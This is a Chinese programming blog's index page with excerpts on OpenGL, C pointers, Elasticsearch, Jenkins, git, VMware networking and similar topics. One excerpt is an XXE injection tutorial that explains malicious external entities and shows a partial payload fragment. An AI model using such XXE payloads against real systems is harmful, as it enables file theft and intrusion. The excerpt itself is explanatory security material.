		<h2 class="list__title post__title">
			<a href="/posts/2c9767f5f7d1ad59c5f2c32a18dc4db4/" rel="bookmark">
			OpenGL入门（四）之纹理Texture
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本系列文章为Learn OpenGL个人学习总结！
OpenGL入门（一）之认识OpenGL和创建Window
OpenGL入门（二）之渲染管线pipeline，VAO、VBO和EBO
OpenGL入门（三）之着色器Shader
OpenGL入门（四）之纹理Texture
OpenGL入门（五）之Matrix矩阵操作和坐标系统
OpenGL进阶（一）之帧缓冲FrameBuffer
OpenGL进阶（二）之像素缓冲PixelBuffer
纹理 纹理是一个2D图片（甚至也有1D和3D的纹理），它可以用来添加物体的细节！我们可以在一张图片上插入非常多的细节，这样就可以让物体非常精细而不用指定额外的顶点，来减小开销！
为了能够把纹理映射(Map)到三角形上，我们需要指定三角形的每个顶点各自对应纹理的哪个部分。这样每个顶点就会关联着一个纹理坐标(Texture Coordinate)，用来标明该从纹理图像的哪个部分采样（采集片段颜色）。之后在图形的其它片段上进行片段插值(Fragment Interpolation)。
纹理坐标在x和y轴上，范围为0到1之间（注意我们使用的是2D纹理图像）。使用纹理坐标获取纹理颜色叫做采样(Sampling)。纹理坐标起始于(0, 0)，也就是纹理图片的左下角，终始于(1, 1)，即纹理图片的右上角。
一个纹理坐标：
float texCoords[] = { 0.0f, 0.0f, // 左下角 1.0f, 0.0f, // 右下角 0.5f, 1.0f // 上中 }; 纹理环绕方式 当纹理坐标超出默认范围时，可以设置环绕方式来展示不同的视觉效果输出！默认为GL_REPEAT，还有GL_MIRRORED_REPEAT，GL_CLAMP_TO_EDGE和GL_CLAMP_TO_BORDER！
前边提到过纹理坐标的分量可以通过STPQ访问：
// set the texture wrapping parameters glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);	// set texture wrapping to GL_REPEAT (default wrapping method) glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT); 纹理过滤 纹理像素(Texture Pixel）：组成一张图片的无数个像素点
纹理坐标：设置的顶点数组
OpenGL以这个顶点的纹理坐标数据去查找纹理图像上的像素，然后进行采样提取纹理像素的颜色。那么就会有一个问题，在对应查找像素的时候，用什么方式去拿像素颜色，OpenGL提供了纹理过滤来帮助我们选择，这里有两个重要的选项！
GL_NEAREST（也叫邻近过滤，Nearest Neighbor Filtering）是OpenGL默认的纹理过滤方式。当设置为GL_NEAREST的时候，OpenGL会选择中心点最接近纹理坐标的那个像素。GL_LINEAR（也叫线性过滤，(Bi)linear Filtering）它会基于纹理坐标附近的纹理像素，计算出一个插值，近似出这些纹理像素之间的颜色。 当进行放大(Magnify)和缩小(Minify)操作的时候可以设置纹理过滤的选项：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c9767f5f7d1ad59c5f2c32a18dc4db4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ab72f221e477cb99e4d5dc89dec0bbf/" rel="bookmark">
			数组a、*a、&amp;a、*(&amp;a)、*(&amp;a&#43;1)、*(a&#43;1)……
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		int main() { int a[3] = { 0,9,2 }; printf("%d\n", a); // 732951912 printf("%d\n", *a); // 0 printf("%d\n", &amp;a); // 732951912 printf("%d\n", a+1); // 732951916 printf("%d\n", *(a+1)); // 9 printf("%d\n", *a+1); // 1 printf("%d\n", &amp;a+1); // 732951924 printf("%d\n", *(&amp;a)); // 732951912 printf("%d\n", *(&amp;a+1)); // 732951924 } a：数组首元素的地址
*a：数组首元素的值
&amp;a：数组的首地址
a+1：数组第二个元素的地址
*(a+1)：数组第二个元素的值
*a+1：数组首元素的值+1
&amp;a+1：数组首地址加上整个数组所占的空间，有三个元素则+3*4
*(&amp;a)：数组首元素的地址的地址的值，也就是数组首元素的地址 （感觉有点绕，不知道对不对）
*(&amp;a+1)：(&amp;a+1)的地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d8b562b1893b76e519e26254a09eec9/" rel="bookmark">
			PC端微信dat图片怎么查看？这里有神器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想要查看微信image文件，发现竟然是dat格式打不开怎么办？网上查到的解码软件都要收费怎么办？
可以下载这个神器！不会被提示有病毒，可以安心使用。点进文章链接下载即可~
文章链接：微信dat图片批量解密、查看、整理工具：WxDatViewer 2.2[2021.11.19] 吾爱大佬开发的神器 – 精脑汇 (uxpc.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eed7f1c5b563a934f927cabdfaf0118f/" rel="bookmark">
			【论文翻译】语音增强：基于深度神经网络的语音增强实验研究 2014
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		An Experimental Study on Speech Enhancement Based on Deep Neural Networks
Yong Xu, Jun Du, Li-Rong Dai, and Chin-Hui Lee, Fellow, IEEE
机翻 不准确 请见谅
摘要 本文提出了一种基于回归的语音增强框架，该框架使用具有多层深度架构的深度神经网络（DNN）。在DNN学习过程中，大的训练集确保了强大的建模能力，以估计从观察到的噪声语音到期望的干净信号的复杂非线性映射。声学背景被发现可以改善语音的连续性，从而成功地从背景噪声中分离出来，而不存在常规语音增强算法中常见的令人讨厌的音乐伪影。在多条件训练下进行了一系列先导实验，使用超过100小时的模拟语音数据，即使在不匹配的测试条件下也具有良好的泛化能力。与对数最小均方误差方法相比，所提出的基于DNN的算法在各种目标质量度量方面往往取得显著改进。
简介 几十年来，在语音通信中，增强单麦克风记录的噪声语音的问题吸引了大量研究工作[1]。文献[1]-[3]在各种假设下提出了许多不同的方法。这些技术中的大多数通常不能很好地估计干净的语音，并导致高水平的音乐噪声伪影（ musical noise artifacts）[4]。
早期使用浅层神经网络（SNN）作为非线性滤波器的早期工作[5]–[7]]。然而，具有较少训练数据和相对较小网络规模的SNN模型的性能通常不令人满意。此外，从随机初始化开始的基于梯度的优化通常会陷入“明显的局部极小值或平台”[8]，尤其是当考虑到深层网络结构时更甚。Hinton等人[9]最近指出，使用贪婪的逐层无监督学习程序重新引起了DNN的兴趣，并成功地应用于自动语音识别（ASR）和一些相关任务，优于最先进的系统（例如，[10]，[11]）。
其他数据驱动方法试图对时频 (T-F) 单元进行二元分类决策，例如估计单声道语音分离的理想二元掩码 [13]，但是 T-F 单元的声学上下文信息在一个分类框架。在 [14] 中，DNN 用于估计 Mel 频域中的平滑理想比率掩码 (IRM)，以实现稳健的 ASR。
在这项研究中，我们建议使用包含噪声语音中不同关键因素（包括说话者、噪声类型和信噪比）的多条件训练数据，使用基于非线性 DNN 的回归模型来学习从嘈杂语音到干净语音的复杂映射函数比率（SNR）。据我们所知，这是使用回归 DNN 模型进行具有大量训练数据的语音增强的领先研究之一。
这封信的其余部分组织如下。在第二节中，我们提出了基于 DNN 的语音增强系统。第三部分提供了一组评估实验，以评估各种 DNN 配置中的系统性能。最后，我们在第四节总结了我们的发现。
用于语音增强的深度神经网络 所提出的语音增强系统的一个块如图 1 所示。在训练阶段，回归 DNN 模型从立体声数据的集合中训练出来，由对数功率谱特征表示的噪声和干净语音对组成。在增强阶段，训练好的 DNN 模型被输入噪声语音的特征，以生成增强的对数功率谱特征。额外的相位信息是从原始的嘈杂语音中计算出来的。假设是相位信息对人类听觉感知并不重要，因此只需要估计语音的幅度或功率[7]。最后采用重叠相加法合成估计干净语音的波形。特征提取模块和波形重建模块的详细描述可以在[12]中找到。
A. 使用噪声数据预训练 DNN DNN 训练从一个随机初始化的网络开始，通常会发现局部最小值很差 [9]，尤其是当隐藏层的数量增加时。因此，如在 [17] 中一样，我们首先尝试通过堆叠多个受限玻尔兹曼机 (RBM) [8] 来学习噪声对数谱的深度生成模型。图 2 的左侧部分说明了用噪声数据馈送的 RBM 预训练。第一个是 Gaussian-Bernoulli RBM，它有一个可见的线性变量层，连接到一个隐藏层。然后可以在高斯-伯努利 RBM 之后堆叠一堆 Bernoulli-Bernoulli RBM，可以以无监督的贪婪方式逐层训练它们[9]。在此期间，使用称为对比散度 (CD) 的客观标准来更新每个 RBM [8] 的参数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eed7f1c5b563a934f927cabdfaf0118f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bb7b8d3741e2e4673cfec85c1229a67/" rel="bookmark">
			ElasticSearch（一）【简介】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、ES简介 1.1 概述 什么是ElasticSearch
ElasticSearch简称ES，是基于Apache Lucene构建的开源搜索引擎，是当前最流行的企业级搜索引擎。Lucene本身就可以被认为迄今为止性能最好的一款开源所搜引擎工具包，但是Lucene的API相对复杂，需要深厚的搜索理论。很难集成到实际应用当中去。ES采用Java语言编写，提供了简单易用的Restful API，开发者可以使用其简单的Restful API，开发相关的搜索功能，从而避免Lucene的复杂性
ElasticSearch诞生
多年前，一个叫做Shay Banon的刚结婚不久的失业开发者，由于妻子要去伦敦学习厨师，他便跟着也去了。在他找工作的过程中，为了给妻子构建一个食谱的搜索引擎，他开始构建一个早期版本的Lucene
直接基于Lucene工作会比较困难，所以Shay开始抽象Lucene代码以便Java程序员可以在应用中添加搜索功能。他发布了他的第一个开源项目，叫做"Compass"
后来Shay找到一份工作，这份工作处在高性能和内存数据网格的分布式环境中，因此高性能的、实时的、分布式的搜索引擎也是理所当然需要的。然后他决定重写Compass库使其成为一个独立的服务叫做Elasticsearch
第一个公开版本出现在2010年2月，在那之后Elasticsearch已经成为Github上最受欢迎的项目之一，代码贡献者超过300人。一家主营Elasticsearch的公司就此成立，他们一边提供商业支持一边开发新功能，不过Elasticsearch将永远开源且对所有人可用
全文检索
全文检索是计算机程序通过扫描文章中的每一个词、对每一个词建立一个索引，指明该词在文章中出现的次数和位置。当用户查询时，根据建立的索引查找，类似于通过字典的检索字表查字的过程
全文索引（Full-Text Retrieval）以文本作为检索对象，找出含有指定词汇的文本。全面、准确和快速是衡量全文检索系统的关键指标
只处理文本、不处理语义搜索时英文不区分大小写结果列表有相关度排序 1.2 基础安装 环境准备
centos7.x+jdk11+（可以不需要配置jdk，往下看即可） 官方下载地址：https://www.elastic.co/cn/downloads/elasticsearch
查看以前的版本
选择对应的版本号和引擎，点击Download
安装Linux版本的引擎包
下载好后，使用 xftp 将压缩包上传到Linux目录下
将压缩包进行解压
tar -zxvf elasticsearch-7.14.0-linux-x86_64.tar.gz 查看elasticsearch自带的java版本
解决自带jdk版本过低问题
- 这个错误是系统jdk版本与es要求jdk版本不一致,es默认需要jdk11以上的版本,当前系统使用jdk8,需要从新安装jdk11才行 - 解决方案 方案一: 安装jdk11+,并配置环境变量 方案二: ES包中目录就是es需要的jdk,只需要将这个目录配置到ES_JAVA_HOME环境变量即可 这里我们使用方案二解决
# 配置环境变量,在/etc/profile目录文件下,文件底部添加如下 vim /etc/profile # elasticsearch自带jdk的路径 ES_JAVA_HOME=/usr/local/elasticsearch/elasticsearch-7.14.0/jdk export ES_JAVA_HOME # 重新加载环境 source /etc/profile 【注意】es默认是不允许root用户去启动elasticsearch，所以需要给普通用户添加权限
运行成功的标志
1.3 访问测试 本地访问
使用外部端口访问，默认是在窗口运行，并且端口号是9200
# 访问端口 curl http://localhost:9200 # 添加参数-d后台启动 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bb7b8d3741e2e4673cfec85c1229a67/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1c3a5decb056a21de0751704a972fc1/" rel="bookmark">
			解决Jenkins中Maven本地仓库更新不及时的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 当私服的内容发生变动或有其他依赖更新时，使用Jenkins构建镜像时还使用老的依赖导致构建失败。
报错如下：
[ERROR] COMPILATION ERROR : [INFO] ------------------------------------------------------------- [ERROR] /var/jenkins_home/workspace/xxx-gateway/xxx-gateway/src/main/java/com/xxx/gateway/filter/AuthGlobalFilter.java:[36,83] cannot find symbol symbol: variable JWT_TOKEN_NICK_NAME location: class com.xxx.base.constant.Auth [ERROR] /var/jenkins_home/workspace/xxx-gateway/xxx-gateway/src/main/java/com/xxx/gateway/filter/AuthGlobalFilter.java:[37,82] cannot find symbol symbol: variable JWT_TOKEN_ROLE_IDS location: class com.xxx.base.constant.Auth [ERROR] /var/jenkins_home/workspace/xxx-gateway/xxx-gateway/src/main/java/com/xxx/gateway/filter/AuthGlobalFilter.java:[39,29] cannot find symbol symbol: method builder() 解决方法 配置maven setting.xml文件
&lt;repository&gt; &lt;id&gt;xxx&lt;/id&gt; &lt;url&gt;https://xxxx&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;updatePolicy&gt;always&lt;/updatePolicy&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;updatePolicy&gt;always&lt;/updatePolicy&gt; &lt;/snapshots&gt; &lt;/repository&gt; 关键点在于: enabled -&gt; true,updatePolicy -&gt; true，这样每次构建是都会去刷新依赖。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86d2901dfe9aae5c85cce0f605e0f936/" rel="bookmark">
			配置git的ssh码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 设置本地git账户邮箱和用户名
1-1：输入命令 git config --global user.name "Git账号"
1-2：git config --global user.email "Git邮箱"
1-3：输入命令git config --global --list 查看配置是否正确。
2. 生成新的SSH密钥
输入命令ssh-keygen -t rsa -C "你的Git邮箱"
然后连续敲三次回车，如果没问题你会看到如下界面
输入命令cat ~/.ssh/id_rsa.pub，查看生成的公钥，全部复制
3. 将SSH公钥添加至Git账户
打开git，点击用户头像，再点击设置，选择ssh
点击New SSH key
将id_rsa.pub的内容复制至Key中，输入Title后（Title不输入也可以，不输入的话会根据用户输入的Key自动填写），点击Add SSH Key。
添加成功。
4. 验证SSH Key
在git bash 中输入ssh -T git@github.com 然后输入 yes
注：如果使用的远程仓库为gitlab，则命令为ssh -T git@gitlab.com；使用其他远程仓库的话以此类推。
添加成功。
gitlab也是如此添加。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d57d500e57dd518e80a3222a2f32f6b/" rel="bookmark">
			Linux下安装Python3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里安装步骤是去官网下载安装包，自行上传至linux。 1. 官网下载对应的版本后上传至linux中
2. 将压缩文件包上传至自己设置的某了路径目录下，楼主这边设置的是/home。然后执行命令
tar -zxvf +压缩包名
3. 输入以下：
yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make
4. 完成之后，进入到解压后的安装包内，执行如下：
./configure --prefix=你的安装路径（例如/home/Python-3.9.9）
5. 等待好之后，继续输入make，等待编译好，再输入make install等待安装完成。
设置环境变量 1.在安装的文件夹下，进入bin目录，创建python3软连接到系统环境变量中：
ln -s /安装路径/bin/python3.9 /usr/local/bin/python3
ln -s /安装路径/bin/pip3.9 /usr/local/bin/pip3
验证软链是否成功：
ll /usr/local/bin
出现如下图所示表示生成成功：
2. 然后开始配置系统环境变量，打开配置文件：
vi ~/.bash_profile
在最后一行添加配置
export PYTHON_HOME=安装路径 （例如/home/Python-3.9.9）
export PATH=$PYTHON_HOME/bin:$PATH
3. 执行以下语句，使环境变量生效
source ~/.bash_profile
4. 输入 echo $PYTHON_HOME 查看环境变量是否生效，出现如下图，则为配置成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85b409ef03d340b0062bec6b0790cd98/" rel="bookmark">
			Xml实体注入漏洞姿势总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.漏洞介绍 Xml外部实体注入漏洞（XML External Entity Injection）简称XXE，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网探测和攻击，发起dos攻击等危害
XML外部实体注入攻击漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题,触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，造成攻击危害。
二.XML基础知识 XML全称可扩展标记语言。用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。
**内部声明DTD** &lt;!DOCTYPE 根元素 [元素声明]&gt; **引用外部DTD** &lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt; 带有dtd的XML文档实例:
&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE note[ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;/to&gt; &lt;from&gt;@re&lt;/from&gt; &lt;head&gt;v3ry&lt;/head&gt; &lt;body&gt;g00d!&lt;/body&gt; &lt;/note&gt; DTD中普通实体和参数实体:
普通实体：DTD中定义，XML中使用，使用格式： &amp;名;　参数实体：DTD中定义，定义的时候要用%，DTD中使用，使用格式： %名;
(普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。)
三.xxe的利用方式 1.文件读取 有回显的 ①内部引用实体
元素约束Any指元素可以包含任何数据，包含文本数据和子元素
]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; ②外部引用实体
通过XML引用外面的恶意DTD文件来造成XXE漏洞，% xxe定义参数实体，%xxe在dtd中引用参数实体
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85b409ef03d340b0062bec6b0790cd98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd9ce24015dc04c9d0de02c5a73897b5/" rel="bookmark">
			CircuitPython入门贴
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 以前一直玩arduino的，但是恼火于每次写完代码，都要编译并烧录到MCU上，刚开始的blink例程类的小代码还好，起码十几秒钟就能烧录成功，但是后来随着程序代码量的增加，发现每次编译烧录竟然要一分多钟，这一分多钟，我就等着IDE在编译代码并上传，有时候代码的很少一部分都需要来来回回调试十几次，这样修改几个参数，再修改几个参数，来来回回搞个十几次半个小时就过去了，为了调试几个参数就浪费半个小时的时间真的值吗？
人生苦短，我用python！
好吧，python确实强大，编码完成之后，只需要点击保存，代码就运行了起来，如果单纯修改参数的话，可以一分钟就可以来来回回修改好几次参数甚至是十几次参数并且运行成功，这种快感简直太爽了。
以后再也不用浪费时间再编译代码上面了。
好的，那么开始吧。
我用的开发板是慕容流年的板子
正文 安装MU这个开发IDE，这样可以非常方便的就能够用这块板子进行程序的开发。
我们可以烧录慕容流年给的例程，可以看到这里引入了很多模块和库。
在这里，我们把已经固化到circuitpython固件的可供我们引用的代码文件称为模块，例如下面的time就是circuitpython内置的程序文件，里面包含了时间相关的一些函数。
而把我们自己写的或者网络上开源的可引用的代码文件称为库。
这样，我们就能像python一样，非常方便的引用别人写的代码了。
circuitpython本身内置了非常多的模块，即module。
我们可以进入REPL来通过帮助来查看固件都内置了哪些库。 首先，我们打开串口，然后按Ctrl+C即可进入REPL模式，这个根据我的猜测，应该是模仿的linux那种，相当于进入了一个中断(terminal)，我们可以键入命令，通过命令行的方式来操作板子。
根据提示，当我们按下Ctrl+C之后，我们随意再按下任意按键，即可进入REPL模式，这个时候，我们可以输入命令，例如help()来获取帮助了。
我们输入help(”modules")即可命令板子从串口输出所有circuitpython内置的可供我们调用的模块。
可以看到，串口打印出来了我们所有的module，这样我们就知道都有哪些模块可供我们直接调用了。
我们也可以通过访问下面这个网址，来查看控制器支持的模块矩阵
Module Support Matrix - Which Modules Are Available on Which Boards — Adafruit CircuitPython 8.0.0-beta.0 documentation
我们可以在表格中，看到各个不同的控制器型号支持的模块矩阵，以便我们调用 我们点击下面的modules，还能看到通用的核心跨平台(port and board)的模块，这些模块可以在不同型号的控制器上使用，就比如arduino的digitalRead()函数一样，同样是跨平台使用的。
所以，我们首先要做的，就是熟悉核心模块，以及核心模块的API函数，以便快速上手。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10d37253fab31b6747dd14a5a24b269e/" rel="bookmark">
			Jmeter之CSV文件参数化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSV文件参数化(线程共享模式：所有现场)
文件位置：此时CSV文件可以放在测试计划下，线程组外
适用范围：所有线程组有效
CSV文件参数化(线程共享模式：当前线程组)
文件位置：若CSV文件放在测试计划下，线程组外
适用范围：所有线程组有效，但所有线程组都是取同一组迭代变量值
文件位置：若CSV文件放在线程组内，线程外
适用范围：只对当前线程组有效
CSV文件参数化(线程共享模式：当前线程)
文件位置：此时CSV文件可以放在线程下
适用范围：只对当前线程有效
所用通用取值逻辑：
一个线程组下有多个服务请求，不同服务请求中存在相同的变量，则在每次迭代中变量取相同的值
一个线程组下的某个服务请求，该服务请求下某变量存在多个，则在每次迭代中变量取相同的值
备注：
1.CSV文件中的数据是按顺序取值的，当一次迭代使用了这个值之后，下此迭代就使用下个值
2.不管变量为1个或者多个，CSV文件中取值逻辑都适用
3.配置元件：CSV数据文件设置，支持CSV格式和txt格式
4.若参数化的CSV文件为2个或者多个，并且文件中策略都为 遇到文件结束是否再次循环：False 遇到文件
结束是否停止线程：True，那么哪个文件先结束循环，则以那个文件为准结束循环和停止线程
划重点：
1、jmeter通过CSV文件参数化取值时候，虽然每个变量是独立的，但是如果变量是在同一个CSV文件中，所有变量的值的个数应该保持一致，否则，在遍历行数据时，某些变量能取到值，某些变量取不到值，即使CSV数据文件策略为：遇到文件结束再次循环，因为数据是一行一行去循环获取的。
注意：值个数需要一致的变量指的是在同一脚本中都要使用的变量，若变量在该执行脚本中没有被使用，则或有或无、或多或少都没关系
2、CSV配置元件中定义的第一个变量取CSV文件的第一列中值、定义的第二个变量取CSV文件中的第二列值…按顺序依次取值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3420c613062e6d4e83533b65fa9926d4/" rel="bookmark">
			iOS基础介绍（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 本节课内容主要介绍iOS入门的一些知识，以及本课程向大家展示的内容架构。
一、课程的主要内容 1、iOS APP开发准备
常见的APP类型APP基本技术架构开发环境搭建 2、实现APP的基本页面
常用APP页面结构分享导航、列表、滚动视图，WebView以及动画相关开源项目对比分析 3、实现APP的基本功能
网络、图片、存储、音视频、布局等复杂列表、复杂内容页、日志与上报等相关开源项目对比分析 4、实现APP的辅助功能
登录、分享、频道管理等定位、推送Extension开发与应用上架 二、Object C语法 ios入门Object C语法
三、iOS APP开发准备 1、常见的APP类型
2、APP基本技术架构
3、创建你的第一个Xcode工程
四、实现APP的基本页面 END. 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a099602f7acc2dddfcabe1e3659b46e/" rel="bookmark">
			VmWare网络配置，只此一篇就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用VmWare虚拟机连接网络时，经常会遇到以下问题 主机和虚拟机如何建立网络连接虚拟机如何访问Internet在工作单位的网络中如何使用虚拟机，避免虚拟机影响正常网络 二、演示环境 名称备注宿主机系统Win7 64位虚拟机软件VMWare15.1虚机系统Win7 32位 三、网络场景配置 1、宿主机与虚拟机组成局域网，其他电脑不能访问该网络
1.1该方式特点
虚拟机和宿主机组成一个封闭的局域网虚拟机不能访问外部网络、互联网外部网络也不能访问虚拟机 1.2如何实现
.进入VmWare-&gt;主菜单-&gt;虚拟网络编辑器
在网络列表中选择“VMnet1”,如果没有，可以点击“添加网络”按钮增加，为什么是VMnet1呢，这个应该是VMWare默认设置，当然是用其他网卡也是可以的。选择“仅主机模式”并选择“将主机虚拟适配器连接到此网络”和“是用本地DHCP服务将IP地址分配给虚拟机”选项子网IP:10.10.10.0，子网掩码：255.255.255.0，我习惯将“仅主机模式”的子网网段配置为“10.10.10.0”，这个可以根据自己的喜好来设置。 然后修改虚拟机设置，将网络适配器修改为“仅主机模式” 总结 宿主机主机IP地址为：10.10.10.1
虚拟机的IP地址为自动获取，一般为：10.10.10.128
此时宿主机和虚拟机组成了一个小的独立局域网，其他电脑不能访问该网络，同时该网络内的虚拟机也不能访问外部网络，如果大家有此种应用需求，就可以使用该方式搭建网络。
2、虚拟机加入工作单位局域网，其他电脑允许访问虚拟机
2.1该方式特点
可以将虚拟机看做一台新电脑，接入了宿主机所在的网络，如果是在工作单位，可能造成虚拟机IP占用单位同事电脑的IP地址，小心单位网管会找你呦。。。虚拟机允许访问宿主机所在网络的其他电脑虚拟机允许访问Internet互联网（当然宿主机必须可以访问互联网才行）。主机和虚拟机通过单位局域网，互联互通。 2.2如何实现
进入VmWare-&gt;主菜单-&gt;虚拟网络编辑器 在网络列表中选择“VMnet0”,如果没有，可以点击“添加网络”按钮增加，为什么是VMnet0呢，这个应该是VMWare默认设置，当然是用其他网卡也是可以的。选择“桥接模式”选择宿主机访问外部网络的物理网卡，可以使有线网卡也可以是无线网卡。确定，保存 然后修改虚拟机设置，将网络适配器修改为“桥接模式”确定，保存 总结 虚拟机从单位局域网自动获取IP地址，如果未获取到IP地址，需要自己指定IP
宿主机仍然使用单位内原有IP
宿主机和虚拟机同时接入工作单位局域网络
虚拟机通过公司局域网，访问Internet互联网（当然需要网管人员为虚拟机IP开通外网访问权限）。
3、虚拟机通过宿主机访问互联网
3.1该方式特点
虚拟机和宿主机组成小局域网，做到互联互通。虚拟机通过宿主机访问外部网络（此时宿主机起到路由器作用），但外部网络不能访问虚拟机虚拟机允许访问Internet互联网（当然宿主机必须可以访问互联网才行） 3.2如何实现
进入VmWare-&gt;主菜单-&gt;虚拟网络编辑器 在网络列表中选择“VMnet8”,如果没有，可以点击“添加网络”按钮增加，为什么是VMnet8呢，这个应该是VMWare默认设置，当然是用其他网卡也是可以的。选择“NAT模式”并选择“将主机虚拟适配器连接到此网络”和“是用本地DHCP服务将IP地址分配给虚拟机”选项子网IP:20.20.20.0，子网掩码：255.255.255.0，为了与“仅主机模式”区分，我习惯将“NAT模式”的子网网段配置为“20.20.20.0”，这个可以根据自己的喜好来设置。 然后修改虚拟机设置，将网络适配器修改为“仅主机模式” 总结 宿主机主机IP地址为：20.20.20.1
虚拟机的IP地址为自动获取，一般为：20.20.20.128
此时宿主机和虚拟机组成了一个小的独立局域网，其他电脑不能访问该网络
虚拟机可以访问外部网络，如果宿主机可以访问Internet互联网，此时虚拟就具备了访问互联网的能力；我个人在工作单位一般使用该方式，虚拟机可以使用互联网功能，又不会有网管找上门来。如果大家有此种应用需求，就可以使用该方式搭建网络。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c44fa7176e31098b34e504299fd095f/" rel="bookmark">
			音视频开发相关知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、帧率 帧率是以帧称为单位的位图图像连续出现在显示器上的频率。也是每秒钟在屏幕上显示的帧数，简称fps。 2、分辨率 视频的分辨率是指视频在显示器上显示的图像的大小和尺寸，也就是我们常说的480p、720p、1080p等。 3、刷新率 刷新率指的是屏幕每秒画面刷新的次数，具体还分为水平刷新率和垂直刷新率，一般默认垂直刷新率。 这个表示屏幕上每秒重绘多少次图像。 4、编码格式 编码的目标是压缩数据，减少传输压力。常见的编码格式有MPEG、H264等 5、封装格式 编码完成后的音视频数据按照一定的规则放在一个容器中，封装的格式有MKV、AV1、VPx、MP4、WMV、FLV和MOV等 6、码率 比特率，比特率是单位时间内播放连续的媒体，比特率越高则带宽消耗越多。 7、画质与码率 画质不是一个单一因素决定的，其和编码算法、码率都有关系。 8、YUV和RGB的区别 8.1 RGB： RGB颜色空间以R(Red:红)、G(Green:绿)、B(Blue:蓝)三种基本色为基础，进行不同程度的叠加，产生丰富而广泛的颜色。
在图像显示中，假设有一张360* 480 ⼤小的图片，就代表着它有 360* 480个像素点。其中每一个像素点的颜色显示都采用 RGB 编码方法，将 RGB 分别取不同的值，就会展示不同的颜⾊。每个像素点都有红、绿、蓝三个原色，其中每种原色都占用 8 bit存储，也就是1个字节，那 么⼀个像素点也就占用 24 bit，对应着3个字节存储一个像素点数据。
